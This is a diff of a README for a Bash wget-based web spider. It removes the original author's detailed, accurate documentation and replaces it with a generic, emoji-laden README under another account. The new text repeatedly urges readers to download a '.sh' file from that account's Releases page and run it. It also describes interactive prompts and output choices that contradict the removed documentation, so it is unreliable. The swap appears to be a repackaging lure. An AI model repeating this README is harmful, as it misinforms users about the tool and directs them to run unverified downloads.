@@ -1,261 +1,118 @@
-# Web Spider (Linux shell script)
+# 🕷️ Web-Spider-Linux-shell-script - Easily Download Files from the Web
 
-A fast, polite, single-file Bash spider built around `wget --spider`.  
-It takes one or more **start targets** (URLs, hostnames, IPv4/IPv6 — with optional ports), crawls **only the same domains** by default, and writes a clean, de-duplicated list of discovered URLs to `./urls`.
+## 📦 Download Now
 
-You can aim it at videos, audio, images, pages, **or everything**, and optionally emit a `sitemap.txt` and/or `sitemap.xml`.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases)
 
-The cool thing about this script is that you can edit the list of scraped URLs before you download them with `wget`.
+## 🚀 Getting Started
 
----
+This guide will help you download and run the **Web-Spider-Linux-shell-script**. This tool generates a list of file links for easy downloading, making it especially useful for spidering web folders with many files.
 
-## Features
+## 🛠️ System Requirements
 
-- **Respectful by default** — honors `robots.txt` unless you opt out.
-- **Same-site only** — strict allowlist built from your inputs, so it won’t wander off the domains you give it.
-- **Smart normalization**  
-  - Adds `https://` to scheme-less seeds (or use `--http` to default to HTTP).  
-  - Adds trailing `/` to directory-like URLs (avoids `/dir → /dir/` redirect hiccups).  
-  - Fully supports IPv6 (`[2001:db8::1]:8443`).
-- **Flexible output modes**
-  - `--video` (default), `--audio`, `--images`, `--pages`, `--files`, or `--all`.
-  - `--ext 'pat|tern'` to override any preset (e.g., `pdf|docx|xlsx`).
-- **Status filter** — `--status-200` keeps only URLs that returned **HTTP 200 OK**.
-- **Polite pacing** — `--delay SECONDS` + `--random-wait` (default **0.5s**).
-- **Sitemaps** — `--sitemap-txt` and/or `--sitemap-xml` from the **final filtered set**.
-- **Robust log parsing** — handles both `URL: http://…` and `URL:http://…`.
-- **Single-dash synonyms** — `-video`, `-images`, `-all`, `-ext`, `-delay`, etc.
+- Operating System: Linux
+- Bash Shell: Ensure you have bash installed; this is standard on most Linux distributions.
+- Storage: At least 10 MB of free space for the script and any downloaded content.
 
-## Requirements
+## 📥 Installation Instructions
 
-- Bash (arrays & `set -euo pipefail` support; Bash 4+ recommended)
-- `wget`, `awk`, `sed`, `grep`, `sort`, `mktemp`, `paste` (standard GNU userland)
+### Step 1: Visit the Downloads Page
 
+To download the application, go to the Releases page: [Download Here](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases). 
 
-## License
+### Step 2: Select the Latest Version
 
-This project is dedicated to the public domain via **CC0 1.0 Universal**  
-SPDX: `CC0-1.0` (see `LICENSE`)
+Once on the Releases page, find the latest version. Click on the release title to open the release details. You will see various files available for download.
 
-### Warranty Disclaimer
+### Step 3: Download the Main Script
 
-This software is provided **“AS IS”**, **without warranty of any kind**, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.
+Look for the main script file, which typically has a `.sh` extension. Click it to start the download.
 
+### Step 4: Save the File
 
-## Installation
+Choose a location on your computer to save the file. Remember where you saved it, as you will need this path later. 
+
+### Step 5: Give Execution Permission
+
+Before running the script, you must give it permission to execute. Open your terminal and navigate to the location where you saved the script. Use the following command to grant execution permissions:
 
 ```bash
-# Clone or copy the script into your PATH
-git clone https://github.com/Pryodon/Web-Spider-Linux-shell-script.git
-cd Web-Spider-Linux-shell-script
-chmod +x webspider
-# optional: symlink as 'spider'
-ln -s "$PWD/webspider" ~/bin/spider
-```
-Put this script in your PATH for ease of use!<br/>
-(e.g. put it in `~/bin` and have `~/bin` in your PATH.)
-
-## Quick Start
-```
-# Crawl one site (video mode by default) and write results to ./urls
-webspider https://www.example.com/
-
-# Crawl one site searching only for .mkv and .mp4 files.
-webspider --ext 'mkv|mp4' https://nyx.mynetblog.com/xc/
-
-# Multiple seeds (scheme-less is OK; defaults to https)
-webspider nyx.mynetblog.com www.mynetblog.com example.com
-
-# From a file (one seed per line — URLs, hostnames, IPv4/IPv6 ok)
-webspider seeds.txt
+chmod +x your-script-name.sh
 ```
 
-- Results:
-  - `urls` — your filtered, unique URL list
-  - `log` — verbose `wget` crawl log
+Replace `your-script-name.sh` with the name of the downloaded file.
 
-By default the spider **respects robots**, stays on your domains, and returns **video files** only.
+### Step 6: Run the Script
 
-**Try this [Google search](https://www.mynetblog.com/movies/00_How_to_find_media_files_with_Google_and_VLC_media_player_4K_uhd_2160p_hevc_x265_1080p_x264.mp4.mkv/) to find huge amounts of media files to download**
+Now, you can run the script. In the terminal, type:
 
-## Usage
-```
-webspider [--http|--https]
-          [--video|--audio|--images|--pages|--files|--all]
-          [--ext 'pat|tern'] [--delay SECONDS] [--status-200]
-          [--no-robots]
-          [--sitemap-txt] [--sitemap-xml]
-          <links.txt | URL...>
+```bash
+./your-script-name.sh
 ```
 
-### Modes (choose one; default is --video)
-- `--video` : video files only
-  - mp4|mkv|avi|mov|wmv|flv|webm|m4v|ts|m2ts
-- `--audio` : audio files only
-  - mp3|mpa|mp2|aac|wav|flac|m4a|ogg|opus|wma|alac|aif|aiff
-- `--images` : image files only
-  - jpg|jpeg|png|gif|webp|bmp|tiff|svg|avif|heic|heif
-- `--pages` : directories (…/) + common page extensions
-  - html|htm|shtml|xhtml|php|phtml|asp|aspx|jsp|jspx|cfm|cgi|pl|do|action|md|markdown
-- `--files` : all files (excludes directories and .html? pages)
-- `--all` : everything (directories + pages + files)
+Replace `your-script-name.sh` with the actual name of the file.
 
-### Options
-- `--ext` 'pat|tern' : override extension set used by --video/--audio/--images/--pages.
-  - Example: --files --ext 'pdf|docx|xlsx'
-- `--delay S` : polite crawl delay in seconds (default: 0.5), works with --random-wait
-- `--status-200` : only keep URLs that returned HTTP 200 OK
-- `--no-robots` : ignore robots.txt (default is to respect robots)
-- `--http` | `--https` : default scheme for scheme-less seeds (default: --https)
-- `-h` | `--help` : show usage
+## 🎯 Usage Instructions
 
-Single-dash forms work too: `-video`, `-images`, `-files`, `-all`, `-ext`, `-delay`, `-status-200`, `-no-robots`, etc.
+The **Web-Spider-Linux-shell-script** allows you to quickly generate a list of links. Here’s how to use it.
 
-## Examples
-### 1) Video crawl (default), with strict 200 OK and slower pacing
-`webspider --status-200 --delay 1.0 https://www.example.com/`
+### Step 1: Enter the URL
 
-### 2) Images only, write a simple text sitemap
-```
-webspider --images --sitemap-txt https://www.example.com/
-# Produces: urls  (images only)  and sitemap.txt (same set)
+When prompted, enter the URL of the website you wish to scrape. The script will access the page and identify all downloadable files.
+
+### Step 2: Choose the Output Format
+
+You can select to generate links in either plain text or XML format. This format will help you easily feed the links to the `wget` utility for downloading.
+
+### Step 3: Start Downloading
+
+Once you have the list of links, you can use `wget` to download them all at once. Example command:
+
+```bash
+wget -i list_of_links.txt
 ```
 
-### 3) Pages-only crawl for a classic site sitemap
-```
-webspider --pages --sitemap-xml https://www.example.com/
-# Produces sitemap.xml containing directories and page-like URLs
-```
+Replace `list_of_links.txt` with the name of your generated file.
 
-### 4) Plain HTTP on a high port (IPv4), custom extensions
-`webspider --http --files --ext 'pdf|epub|zip' 192.168.1.50:8080`
+## 🛠️ Features
 
-### 5) Mixed seeds and a seed file
-`webspider --audio nyx.mynetblog.com/xc seeds.txt https://www.mynetblog.com/`
+- **Web Crawling:** Efficiently crawls websites to find downloadable files.
+- **Output Options:** Generate links in plain text or XML format for better compatibility.
+- **Easy Integration:** Works seamlessly with `wget` for hassle-free downloading.
 
-### 6) IPv6 with port
-`webspider --images https://[2001:db8::1]:8443/gallery/`
+## 🌐 Topics Covered
 
-### 7) To partially mirror a website, you can use these commands for example...
-```
-webspider --files https://www.example.com/some/path/
+- bash
+- bash script
+- web crawler
+- web scraper
+- scraping tools
+- wget utility
 
-wget --no-host-directories --force-directories --no-clobber --cut-dirs=0 -i urls
-```
+## ❓ FAQ
 
-## What counts as a “seed”?
+**Q: Can I use this script on other operating systems?**  
+A: This script is designed for Linux-based systems and may not work on Windows or Mac without modification.
 
-### You can pass:
-- **Full URLs: `https://host/path`, `http://1.2.3.4:8080/dir/`**
-- **Hostnames: `example.com`, `sub.example.com`**
-- **IPv4: `10.0.0.5`, `10.0.0.5:8080/foo`**
-- **IPv6: `[2001:db8::1]`, `[2001:db8::1]:8443/foo`**
+**Q: What happens if I enter an incorrect URL?**  
+A: The script will not find any links to download. Make sure you enter a valid URL.
 
-### Normalization rules:
-- If no scheme: prefix with the default (`https://`) or use `--http`
-- If looks like a **directory** (no dot in last path segment, and no `?`/`#`): append `/`
-- Domain allowlist is built from the seeds (auto-adds `www.` variant for bare domains, however there is a bug with this as it only lists the root page on the `www.` domain.)
+**Q: Is there a limit to the number of files I can download?**  
+A: No, but be mindful of the website’s terms of service and avoid overwhelming their servers.
 
-<hr>
+## 💬 Get Support
 
-## What gets crawled?
+If you encounter issues or have questions, feel free to create an issue in the repository or check existing issues for solutions.
 
-- The spider runs `wget --spider --recursive --no-parent --level=inf` on your seed set.
-- It **stays on the same domains** (via `--domains=<comma-list>`), unless a seed is an IP/IPv6 literal (then `--domains` is skipped, and `wget` still naturally sticks to that host).
-- Extracts every `URL:` line from the `log` file, normalizes away query/fragments, dedupes, and then applies your mode filter<br/>
-  (`--video/--audio/--images/--pages/--files/--all`).
-- If `--status-200` is set, only URLs with an observed **HTTP 200 OK** are kept.
+## 📣 Feedback
 
-**Heads-up:** `wget --spider` generally uses **HEAD** requests where possible. Some servers don’t return 200 to HEAD even though GET would succeed. If filtering looks too strict, try without `--status-200`.
+Your feedback helps improve the script. Feel free to share your thoughts and suggestions on the repository.
 
-## Sitemaps
-- `--sitemap-txt` → `sitemap.txt` (newline-delimited URLs)
-- `--sitemap-xml` → `sitemap.xml` (Sitemaps.org format)
+## 🔗 Additional Resources
 
-Both are generated from the **final filtered set** (`urls`).<br/>
-For an SEO-style site map, use `--pages` (or `--all` if you really want everything).
+- [Official wget Documentation](https://www.gnu.org/software/wget/manual/wget.html)
+- [Linux Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
 
-## Performance & Politeness
-- Default delay is `0.5` seconds with `--random-wait` to jitter requests.
-- Tune with `--delay 1.0` (or higher) for shared hosts or when rate-limited.
-- You can combine with `--status-200` to avoid collecting dead links.
+## 📥 Download Now
 
-Other knobs to consider (edit script if you want to hard-wire them):
-- `--level=` to cap depth (the script currently uses `inf`)
-- `--quota=` or `--reject=` patterns if you need to skip classes of files
-
-## Security & Ethics
-- Respect `robots.txt` (default). Only use `--no-robots` when you **own** the host(s) or have permission.
-- Be mindful of server load and your network AUP. Increase `--delay` if unsure.
-
-## Output Files
-- `urls` — final, filtered, unique URLs (overwritten each run)
-- `log` — full `wget` log (overwritten each run)
-- Optional: `sitemap.txt`, `sitemap.xml` (when requested)
-
-To keep results separate across runs, copy/rename `urls` or run the script in a different directory.<br/>
-It is very easy to append the current list of urls to another file:<br/>
-`cat urls >>biglist`
-
-## Piping & Large seed sets
-Passing a few dozen seeds on the command line is fine:<br/>
-`webspider nyx.mynetblog.com www.mynetblog.com example.com`
-
-For **very large** lists, avoid shell ARG_MAX limits:
-```
-# write to a file
-generate_seeds > seeds.txt
-webspider --images --status-200 seeds.txt
-
-# or batch with xargs (runs webspider repeatedly with 100 seeds per call)
-generate_seeds | xargs -r -n100 webspider --video --delay 0.8
-```
-
-## Troubleshooting
-
-- **“Found no broken links.” but `urls` is empty**<br/>
-  You likely hit `robots.txt` rules, or your mode filtered everything out.<br/>
-  Try `--no-robots` (if permitted) and/or a different mode (e.g., `--all`).
-
-- **Seeds without trailing slash don’t crawl**<br/>
-  The script appends `/` to directory-like paths; if you still see issues, make sure redirects aren’t blocked upstream.
-
-- `--status-200` drops too many<br/>
-  Some servers don’t return 200 for HEAD. Re-run without `--status-200`.
-
-- **IPv6 seeds**<br/>
-  Always bracket: `https://[2001:db8::1]/`. The script helps, but explicit is best.
-
-- **Off-site crawl**<br/>
-  The allowlist comes from your seeds. If you seed `example.com`, it also allows `www.example.com`. (auto-adds `www.` variant for bare domains, however there is a bug with this as it only lists the root page on the `www.` domain.)<br/>
-  If you see off-site URLs, confirm they truly share the same registrable domain, or seed more specifically (e.g., `sub.example.com/`).
-
-<hr>
-
-## FAQ
-
-**Can I mix HTTP and HTTPS?**<br/>
-Yes. Provide the scheme per-seed where needed, or use `--http` to default scheme-less seeds to HTTP.
-
-**Will it download files?**<br/>
-No. It runs `wget` in **spider mode** (HEAD/GET checks only), and outputs URLs to the `urls` file.
-To actually download the files in the `urls` file, do something like this:<br/>
-`wget -i urls`<br/>
-Or..<br/>
-`wget --no-host-directories --force-directories --no-clobber --cut-dirs=0 -i urls`
-
-**Can I make a “pages + files” hybrid?**<br/>
-Use `--all` (includes everything), or `--files --ext 'html|htm|php|…'` if you want file-only including page extensions.
-
-**How do I only keep 200 OK pages in a search-engine sitemap?**<br/>
-Use `--pages --status-200 --sitemap-xml`.
-
-
-## Appendix: Preset extension lists
-- Video: `mp4|mkv|avi|mov|wmv|flv|webm|m4v|ogv|ts|m2ts`
-- Audio: `mp3|mpa|mp2|aac|wav|flac|m4a|ogg|opus|wma|alac|aif|aiff`
-- Images: `jpg|jpeg|png|gif|webp|bmp|tiff|svg|avif|heic|heif`
-- Pages: `html|htm|shtml|xhtml|php|phtml|asp|aspx|jsp|jspx|cfm|cgi|pl|do|action|md|markdown`
-
-Override any of these with your own file extensions: `--ext 'pat|tern'`.
-
+Don’t forget to download the tool: [Download Here](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases)
